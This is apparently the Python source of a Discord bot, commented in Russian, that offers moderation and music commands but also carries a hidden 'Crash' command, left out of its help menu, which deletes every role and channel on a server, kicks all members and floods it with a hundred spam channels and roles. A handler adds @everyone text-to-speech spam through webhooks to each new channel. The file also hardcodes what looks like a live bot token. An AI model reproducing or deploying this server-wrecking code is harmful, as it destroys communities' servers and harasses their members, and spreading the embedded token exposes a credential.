import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
from discord.utils import get
from youtube_dl import YoutubeDL


YDL_OPTIONS = { 'format' : 'worstaudio/best', 'noplaylist' : 'False', 'simulate' : 'True',
'preferredquality' : '192', 'preferredcodec' : 'mp3', 'key' : 'FFmpegExtractAudio'}
FFMPEG_OPTIONS = { 'before_options' : '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options' : '-vn' }


PREFIX = '!'
intents = discord.Intents.default()
intents.members = True

bot = commands.Bot( command_prefix = PREFIX, intents = intents )
bot.remove_command( 'help' )

@bot.event

async def on_ready():
    print( 'BOT connected' )
# статус бота
    await bot.change_presence( status = discord.Status.online, activity = discord.Game( '!help' ) )
# !hello

@bot.command( pass_context = True )

async def hello( ctx ):
    author = ctx.message.author
    await ctx.send ( f' { author.mention } ' 'Hello. I am a Bot for discord.' )

# Crash

@bot.command()
@commands.has_permissions( administrator = True )

async def Crash( ctx ):
        guild = ctx.message.guild     
        with open( '1471204469_preview_image-1536x864.jpeg', 'rb' ) as f:
            icon = f.read()
        await guild.edit( name = "Crash-By-MEDALLIST", icon = icon )

        await ctx.message.delete()

        for m in ctx.guild.roles:
            try:
                await m.delete( reason = "Краш сервера" )
            except:
                pass

        for channel in ctx.guild.channels:  # собираем
                try:
                        await channel.delete( reason = "Краш сервера" )  # удаляем
                except:
                        pass


        for _ in range( 100 ):
            await guild.create_text_channel( 'crash-by-MEDALLIST-Bot' )

        for _ in range( 100 ):
          await guild.create_role( name = 'crash-by-Crash-Role' )

        for m in ctx.guild.members:
          try:
           await m.kick( reason = "Краш сервера" )
          except:
           pass
        


@bot.event
async def on_guild_channel_create( channel ):
    webhook = await channel.create_webhook( name = "Crash-By-VEXERA-BOT" )
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url( str( webhook_url ), adapter = discord.AsyncWebhookAdapter( session ) )
      for i in range( 50 ):
        try:
          await webhook.send( "**@everyone лохи крашнуты или мне кажется?? Происходит краш сервера всем лежать By VEXERA-BOT 🙈**", tts = True )
        except:
          pass       

# clear message

@bot.command( pass_context = True )
@commands.has_permissions( administrator = True )

async def clear ( ctx, amount = 100 ):
    await ctx.channel.purge( limit = amount )

# kick

@bot.command( pass_context = True )
@commands.has_permissions( administrator = True )

async def kick( ctx, member: discord.Member, *, reason = None ):
    await ctx.channel.purge( limit = 1 )

    await member.kick( reason = reason )
    await ctx.send( f'kick user { member.mention }' )

# ban

@bot.command( pass_context = True )
@commands.has_permissions( administrator = True )

async def ban( ctx, member : discord.Member, *, reason = None ):
    await ctx.channel.purge( limit = 1 )

    await member.ban( reason = reason )
    await ctx.send( f'ban user { member.mention }' ) 

# command help

@bot.command( pass_context = True )

async def help ( ctx ):
    emb = discord.Embed( title = 'Навигация по командам' )

    emb.add_field( name = '{}clear'.format( PREFIX ), value = 'Очистка чата (Administrator)' )
    emb.add_field( name = '{}kick'.format( PREFIX ), value = 'Удаление участника с сервера (Administrator)' )
    emb.add_field( name = '{}ban'.format( PREFIX ), value = 'Ограничение доступа к серверу (Administrator)' )
    emb.add_field( name = '{}user_mute'.format( PREFIX ), value = 'Ограничение доступа к чату (Administrator)' )
    emb.add_field( name = '{}join'.format( PREFIX ), value = 'Бот подключается к вашему голосовому каналу (User)' )
    emb.add_field( name = '{}leave'.format( PREFIX ), value = 'Бот покидает ваш голосовой канал (User)' )
    emb.add_field( name = '{}play'.format( PREFIX ), value = 'Бот присоединяется к каналу и начинает воспроизводить музыку. !play + url (User)' )
    await ctx.send( embed = emb )

# mute

@bot.command( pass_context = True )
@commands.has_permissions( administrator = True )

async def user_mute( ctx, member: discord.Member ):
    await ctx.channel.purge( limit = 1 )
# выдает роль
    mute_role = discord.utils.get( ctx.message.guild.roles, name = 'mute' )

    await member.add_roles( mute_role )
    await ctx.send( f'У { member.mention }, ограничение чата за нарушение прав!' )

# join Bot to voice

@bot.command()
async def join( ctx ):
    global voice
    channel = ctx.message.author.voice.channel
    voice = get( bot.voice_clients, guild = ctx.guild )

    if voice and voice.is_connected():
        await voice.move_to( channel )
    else:
        voice = await channel.connect()
        await ctx.send( f'Бот присоединился к каналу: { channel }' )

@bot.command()
async def leave( ctx ):
    channel = ctx.message.author.voice.channel
    voice = get( bot.voice_clients, guild = ctx.guild )

    if voice and voice.is_connected():
        await voice.disconnect()
    else:
        voice = await channel.connect()
        await ctx.send( f'Бот отключился от канала: { channel }' )



@bot.command()
async def play( ctx, *, arg ):
    vc = await ctx.message.author.voice.channel.connect()

    with YoutubeDL( YDL_OPTIONS ) as ydl:
        if 'https://' in arg:
            info = ydl.extract_info( arg, download = False )
        else:
            info = ydl.extract_info( f"ytsearch:{ arg }", download=False )[ 'entries' ][ 0 ]

    url = info[ 'formats' ][ 0 ][ 'url' ]

    vc.play( discord.FFmpegPCMAudio( executable = "ffmpeg\\ffmpeg.exe", source = url, **FFMPEG_OPTIONS ))


token = 'OTcyMDEwNTU1MTM1MTA3MDky.GXsO1i.GinAf6kFjnxKTHmVVXRQ0sEhIZQ2tmYuil8jGw'
bot.run( token )

